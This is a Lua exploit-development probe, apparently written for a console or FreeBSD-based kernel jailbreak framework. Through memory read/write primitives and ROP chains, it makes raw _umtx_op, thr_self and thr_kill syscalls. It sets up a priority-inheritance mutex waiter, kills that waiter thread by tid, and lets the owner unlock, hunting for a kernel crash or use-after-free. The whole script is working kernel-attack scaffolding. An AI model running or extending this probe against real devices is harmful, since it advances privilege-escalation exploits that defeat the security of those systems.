-- CRASH_CLASS: HIGH
-- PROBE 650a: kill the real tid (443) of a PI waiter, then let the owner unlock
print("=== PROBE 650a: PI WAITER KILLED BY REAL TID ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local M=memory.alloc(8)
wq(N(M),uint64(4))
local ts=memory.alloc(0x10)
wq(N(ts),uint64(0)) wq(N(ts)+8,uint64(300000000))
local cA=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
cA:push_syscall_with_ret(mk(240), U(N(ts)), uint64(0), uint64(0))
cA:push_syscall_with_ret(mk(454), U(N(M)), uint64(6), uint64(0))
local cB=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cB:push_syscall_with_ret(mk(432))
cB:push_syscall_with_ret(mk(454), U(N(M)), uint64(5), uint64(0))
print("[A] chains built")
local ta=thread:new(cA)
ta:run(true)
for i=1,150000 do local x=i end
print(string.format("[B] A locked M=%X",rd(N(M)) or 0))
local tb=thread:new(cB)
tb:run(true)
for i=1,150000 do local x=i end
local tid=nil
if cB.retval_addr and cB.retval_addr[1] then tid=rd(N(cB.retval_addr[1])) end
print(string.format("[C] B tid=%s M=%X",tostring(tid),rd(N(M)) or 0))
if tid and tid>0 then
    local ok,rv=pcall(function() return mk(433)(U(tid),uint64(9),uint64(0),uint64(0),uint64(0),uint64(0)) end)
    print(string.format("[D] thr_kill rv=%s",tostring(ok and rv or "err")))
else
    print("[D] no tid")
end
for i=1,700000 do local x=i end
print(string.format("[E] after unlock M=%X",rd(N(M)) or 0))
local oka=pcall(function() ta:join() end)
print(string.format("[F] A joined=%s",tostring(oka)))
print(string.format("[G] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] done")
